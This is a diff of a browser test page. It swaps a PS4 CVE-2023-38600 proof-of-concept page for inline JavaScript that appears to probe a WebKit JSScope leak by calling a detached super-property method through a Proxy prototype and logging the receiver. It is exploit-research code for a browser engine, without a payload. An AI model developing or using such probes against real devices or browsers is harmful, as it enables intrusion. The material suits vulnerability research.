@@ -2,15 +2,50 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PS4 CVE-2023-38600 Exploit Test</title>
+  <title>WebKit JSScope Leak Test</title>
   <style>
-    body { font-family: monospace; background: black; color: lime; padding: 10px; }
-    pre { white-space: pre-wrap; word-break: break-word; }
+    body { font-family: monospace; background: #111; color: #0f0; padding: 10px; }
   </style>
 </head>
 <body>
-  <h1>PS4 CVE-2023-38600 PoC</h1>
-  <pre id="log">[+] PoC starting...\n</pre>
-  <script src="exploit.js"></script>
+  <div id="log"></div>
+  <script>
+    function log(msg) {
+      const el = document.createElement("div");
+      el.textContent = msg;
+      document.getElementById("log").appendChild(el);
+    }
+
+    class Leaker {
+      leak() {
+        return super.secret;
+      }
+    }
+
+    Leaker.prototype.__proto__ = new Proxy({}, {
+      get(target, prop, receiver) {
+        log("[+] Proxy trap triggered");
+        log("    typeof receiver: " + typeof receiver);
+
+        try {
+          log("    receiver.constructor: " + receiver.constructor);
+        } catch (e) {
+          log("    receiver.constructor threw: " + e.message);
+        }
+
+        try {
+          log("    receiver instanceof Object: " + (receiver instanceof Object));
+        } catch (e) {
+          log("    instanceof check threw: " + e.message);
+        }
+
+        return 1337;
+      }
+    });
+
+    const secret = 42;
+    const { leak } = Leaker.prototype;
+    leak();
+  </script>
 </body>
 </html>
